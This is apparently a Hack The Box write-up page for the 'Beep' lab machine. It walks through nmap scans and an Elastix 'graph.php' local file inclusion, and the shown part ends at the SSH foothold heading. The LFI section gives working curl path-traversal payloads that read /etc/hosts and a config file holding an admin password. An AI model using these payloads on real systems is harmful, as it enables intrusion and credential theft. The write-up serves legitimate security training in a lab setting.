@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;beep#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Beep<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-29</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/beep/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#host-10-10-10-7">Host 10.10.10.7</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#elastix">Elastix</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#foothold-ssh">Foothold (SSH)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#lfi-1">LFI</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#password-spraying">Password spraying</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#flags">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/beep/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2017-03-15</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/1">ch4p</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.10</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-10-7">Host <code>10.10.10.7</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Beep using a TCP SYN <code>nmap</code>
+scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.7<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">22/tcp    open  ssh
+</span><span class="z-text z-plain">25/tcp    open  smtp
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">110/tcp   open  pop3
+</span><span class="z-text z-plain">111/tcp   open  rpcbind
+</span><span class="z-text z-plain">143/tcp   open  imap
+</span><span class="z-text z-plain">443/tcp   open  https
+</span><span class="z-text z-plain">794/tcp   open  unknown
+</span><span class="z-text z-plain">993/tcp   open  imaps
+</span><span class="z-text z-plain">995/tcp   open  pop3s
+</span><span class="z-text z-plain">3306/tcp  open  mysql
+</span><span class="z-text z-plain">4190/tcp  open  sieve
+</span><span class="z-text z-plain">4445/tcp  open  upnotifyp
+</span><span class="z-text z-plain">4559/tcp  open  hylafax
+</span><span class="z-text z-plain">5038/tcp  open  unknown
+</span><span class="z-text z-plain">10000/tcp open  snet-sensor-mgmt
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.7<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE         SERVICE
+</span><span class="z-text z-plain">69/udp    open|filtered tftp
+</span><span class="z-text z-plain">111/udp   open          rpcbind
+</span><span class="z-text z-plain">123/udp   open          ntp
+</span><span class="z-text z-plain">5000/udp  open|filtered upnp
+</span><span class="z-text z-plain">5060/udp  open|filtered sip
+</span><span class="z-text z-plain">10000/udp open          ndmp
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.7<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,25,80,110,111,143,443,993,995,3306,4190,4445,4559,10000<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE    VERSION
+</span><span class="z-text z-plain">22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+</span><span class="z-text z-plain">25/tcp    open  smtp       Postfix smtpd
+</span><span class="z-text z-plain">80/tcp    open  http       Apache httpd 2.2.3
+</span><span class="z-text z-plain">110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+</span><span class="z-text z-plain">111/tcp   open  rpcbind    2 (RPC #100000)
+</span><span class="z-text z-plain">143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+</span><span class="z-text z-plain">443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
+</span><span class="z-text z-plain">993/tcp   open  ssl/imap   Cyrus imapd
+</span><span class="z-text z-plain">995/tcp   open  pop3       Cyrus pop3d
+</span><span class="z-text z-plain">3306/tcp  open  mysql      MySQL (unauthorized)
+</span><span class="z-text z-plain">4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
+</span><span class="z-text z-plain">4445/tcp  open  upnotifyp?
+</span><span class="z-text z-plain">4559/tcp  open  hylafax    HylaFAX 4.3.10
+</span><span class="z-text z-plain">10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+</span><span class="z-text z-plain">Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.7<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>69,111,123,5000,5060,10000<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE         SERVICE VERSION
+</span><span class="z-text z-plain">69/udp    open          tftp    Netkit tftpd or atftpd
+</span><span class="z-text z-plain">111/udp   open          rpcbind 2 (RPC #100000)
+</span><span class="z-text z-plain">123/udp   open          ntp     NTP v4 (secondary server)
+</span><span class="z-text z-plain">5000/udp  open|filtered upnp
+</span><span class="z-text z-plain">5060/udp  open|filtered sip
+</span><span class="z-text z-plain">10000/udp open          webmin  (https on TCP port 10000)
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Beep is running Linux, and the
+version of Apache suggests that it might be CentOS. <code>nmap</code> also found that
+Beep's hostname is <code>beep.localdomain</code>.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.7<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,25,80,110,111,143,443,993,995,3306,4190,4445,4559,10000<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">22/tcp    open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+</span><span class="z-text z-plain">|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+</span><span class="z-text z-plain">25/tcp    open  smtp
+</span><span class="z-text z-plain">|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">|_http-title: Did not follow redirect to https://10.10.10.7/
+</span><span class="z-text z-plain">110/tcp   open  pop3
+</span><span class="z-text z-plain">|_pop3-capabilities: STLS UIDL LOGIN-DELAY(0) APOP PIPELINING USER IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES TOP EXPIRE(NEVER) AUTH-RESP-CODE
+</span><span class="z-text z-plain">111/tcp   open  rpcbind
+</span><span class="z-text z-plain">| rpcinfo: 
+</span><span class="z-text z-plain">|   program version    port/proto  service
+</span><span class="z-text z-plain">|   100000  2            111/tcp   rpcbind
+</span><span class="z-text z-plain">|   100000  2            111/udp   rpcbind
+</span><span class="z-text z-plain">|   100024  1            791/udp   status
+</span><span class="z-text z-plain">|_  100024  1            794/tcp   status
+</span><span class="z-text z-plain">143/tcp   open  imap
+</span><span class="z-text z-plain">|_imap-capabilities: IMAP4rev1 Completed RIGHTS=kxte MAILBOX-REFERRALS OK ACL LISTEXT URLAUTHA0001 NO SORT ID UIDPLUS THREAD=ORDEREDSUBJECT THREAD=REFERENCES BINARY MULTIAPPEND IMAP4 UNSELECT ANNOTATEMORE CONDSTORE SORT=MODSEQ IDLE LIST-SUBSCRIBED ATOMIC CHILDREN STARTTLS CATENATE NAMESPACE X-NETSCAPE QUOTA LITERAL+ RENAME
+</span><span class="z-text z-plain">443/tcp   open  https
+</span><span class="z-text z-plain">|_http-title: Elastix - Login page
+</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+</span><span class="z-text z-plain">| Not valid before: 2017-04-07T08:22:08
+</span><span class="z-text z-plain">|_Not valid after:  2018-04-07T08:22:08
+</span><span class="z-text z-plain">| http-robots.txt: 1 disallowed entry 
+</span><span class="z-text z-plain">|_/
+</span><span class="z-text z-plain">|_ssl-date: 2024-03-02T16:48:22+00:00; +5s from scanner time.
+</span><span class="z-text z-plain">993/tcp   open  imaps
+</span><span class="z-text z-plain">|_imap-capabilities: CAPABILITY
+</span><span class="z-text z-plain">995/tcp   open  pop3s
+</span><span class="z-text z-plain">3306/tcp  open  mysql
+</span><span class="z-text z-plain">4190/tcp  open  sieve
+</span><span class="z-text z-plain">4445/tcp  open  upnotifyp
+</span><span class="z-text z-plain">4559/tcp  open  hylafax
+</span><span class="z-text z-plain">10000/tcp open  snet-sensor-mgmt
+</span><span class="z-text z-plain">| sslv2: 
+</span><span class="z-text z-plain">|   SSLv2 supported
+</span><span class="z-text z-plain">|   ciphers: 
+</span><span class="z-text z-plain">|     SSL2_DES_64_CBC_WITH_MD5
+</span><span class="z-text z-plain">|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+</span><span class="z-text z-plain">|     SSL2_RC4_128_WITH_MD5
+</span><span class="z-text z-plain">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+</span><span class="z-text z-plain">|     SSL2_RC4_128_EXPORT40_WITH_MD5
+</span><span class="z-text z-plain">|_    SSL2_RC2_128_CBC_WITH_MD5
+</span><span class="z-text z-plain">|_ssl-date: 2024-03-02T16:49:35+00:00; +5s from scanner time.
+</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on localhost.localdomain
+</span><span class="z-text z-plain">| Not valid before: 2017-04-07T08:24:46
+</span><span class="z-text z-plain">|_Not valid after:  2022-04-06T08:24:46
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_clock-skew: mean: 4s, deviation: 0s, median: 4s
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP services.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.7<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>69,111,123,5000,5060,10000<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE         SERVICE
+</span><span class="z-text z-plain">69/udp    open          tftp
+</span><span class="z-text z-plain">111/udp   open          rpcbind
+</span><span class="z-text z-plain">| rpcinfo: 
+</span><span class="z-text z-plain">|   program version    port/proto  service
+</span><span class="z-text z-plain">|   100000  2            111/tcp   rpcbind
+</span><span class="z-text z-plain">|   100000  2            111/udp   rpcbind
+</span><span class="z-text z-plain">|   100024  1            791/udp   status
+</span><span class="z-text z-plain">|_  100024  1            794/tcp   status
+</span><span class="z-text z-plain">123/udp   open          ntp
+</span><span class="z-text z-plain">| ntp-info: 
+</span><span class="z-text z-plain">|_  
+</span><span class="z-text z-plain">5000/udp  open|filtered upnp
+</span><span class="z-text z-plain">5060/udp  open          sip
+</span><span class="z-text z-plain">|_sip-methods: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO, PUBLISH
+</span><span class="z-text z-plain">10000/udp open          ndmp
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Host script results:
+</span><span class="z-text z-plain">|_clock-skew: 12s
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script indicates that the HTTP website redirects to HTTPS.</p>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="elastix">Elastix</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>https://10.10.10.7/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/beep/elastix-homepage.png" alt="Elastix homepage" /></p>
+<p>We're served an Elastix login form. If we search online, we find:</p>
+<blockquote>
+<p>Elastix is a unified communications server software that brings together IP
+PBX, email, IM, faxing and collaboration functionality. It has a Web interface
+and includes capabilities such as a call center software with predictive
+dialing.</p>
+<p>— <a href="https://en.wikipedia.org/wiki/Elastix">Wikipedia</a></p>
+</blockquote>
+<p>So this is why Beep has open ports like SMTP, POP3 and IMAP!</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/beep/elastix-homepage-wappalyzer.png" alt="Elastix homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using PHP version <code>5.1.6</code>.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>We need to authenticate to access functionalities.</p>
+<p>If we search online for Elastix's default credentials, we don't find any.</p>
+<p>What about common credentials then? I launched a Cluster bomb attack on Burp
+Suite using
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">this wordlist</a>
+for the usernames and
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt">this wordlist</a>
+for the passwords. Unfortunately, they all failed.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Elastix</code>, we find
+several results. Since we don't known the version of Elastix running on Beep,
+we'll have to try them all.</p>
+<p>It turns out that
+<a href="https://www.exploit-db.com/exploits/37637">Elastix 2.2.0 - 'graph.php' Local File Inclusion</a>
+does work.</p>
+<h4 id="lfi">LFI</h4>
+<p>Elastix version <code>2.2.0</code> is prone to a LFI vulnerability because it fails to
+properly sanitize user-supplied input. The issue lies specifically in the
+<code>graph.php</code> page: if an attacker specifies a specially crafted value to the
+<code>current_language</code> HTTP parameter, he can read any local file.</p>
+<p>Let's try to use the LFI to read the file <code>/etc/hosts</code>, by following the PoC:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>k</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/hosts%00&amp;module=Accounts&amp;action<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain"># Do not remove the following line, or various programs
+</span><span class="z-text z-plain"># that require network functionality will fail.
+</span><span class="z-text z-plain">127.0.0.1       localhost       beep localhost.localdomain localhost
+</span><span class="z-text z-plain">::1             localhost6.localdomain6 localhost6
+</span><span class="z-text z-plain">Sorry! Attempt to access restricted file.
+</span></code></pre>
+<p>It works!</p>
+<p>The PoC suggests to include <code>/etc/amportal.conf</code>, the config file for FreePBX, a
+web-based graphical user interface for Asterisk (which is part of Elastix)
+responsible for handling the configuration and management of Asterisk. This is
+probably the technology behind the login page we encountered on the homepage!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>k</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain"># This is the default admin name used to allow an administrator to login to ARI bypassing all security.
+</span><span class="z-text z-plain"># Change this to whatever you want, don&#39;t forget to change the ARI_ADMIN_PASSWORD as well
+</span><span class="z-text z-plain">ARI_ADMIN_USERNAME=admin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"># This is the default admin password to allow an administrator to login to ARI bypassing all security.
+</span><span class="z-text z-plain"># Change this to a secure password.
+</span><span class="z-text z-plain">ARI_ADMIN_PASSWORD=jEhdIekWmdjE
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's a lot of output, but I immediately noticed potential credentials.</p>
+<h4 id="exploration-2">Exploration</h4>
+<p>Back to Elastix's login page, let's try to log in with the
+<code>admin</code>:<code>jEhdIekWmdjE</code> credentials.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/beep/elastix-dashboard-page.png" alt="Elastix dashboard page" /></p>
+<p>They worked!</p>
+<p>I searched for functionalities that would give me RCE, but I found none. Back to
+known vulnerabilities, none of them are affecting Elastix neither...</p>
+<h2 id="foothold-ssh">Foothold (SSH)</h2>
